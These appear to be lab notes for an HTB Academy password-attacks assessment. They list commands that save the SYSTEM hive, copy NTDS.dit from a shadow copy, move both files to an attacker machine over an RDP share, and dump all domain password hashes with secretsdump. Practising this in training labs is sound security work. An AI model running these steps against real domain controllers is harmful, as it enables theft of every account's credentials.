https://github.com/urbanadventurer/username-anarchy  Username Anarchy
https://medium.com/@lakshyarastogi483/password-attacks-skill-assessment-htb-academy-7a32092d232b
. Save the SYSTEM hive

From an elevated CMD inside the RDP session:

reg.exe save hklm\system C:\system.save


This creates system.save which contains the BootKey. Needed to decrypt NTDS.dit.

2. Create a shadow copy

Still in elevated CMD:

vssadmin create shadow /for=C:


This makes a snapshot of the C: drive. The output will tell you which shadow copy was created, e.g. HarddiskVolumeShadowCopy1.

3. Copy NTDS.dit from shadow copy
mkdir C:\NTDS
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\NTDS\NTDS.dit


This ensures NTDS.dit can be copied even if in use by the system.

4. Transfer files to Kali via your RDP mapped drive

Since you already mapped /home/jython/ as parrotshare, just copy inside the RDP session:

copy C:\system.save \\tsclient\parrotshare\
copy C:\NTDS\NTDS.dit \\tsclient\parrotshare\


Now both files appear in /home/jython/ on Kali.

5. Extract hashes with Impacket

On Kali, run:

secretsdump.py -ntds ~/parrotshare/NTDS.dit -system ~/parrotshare/system.save LOCAL


This will parse NTDS.dit using the SYSTEM hive key and dump all account password hashes.
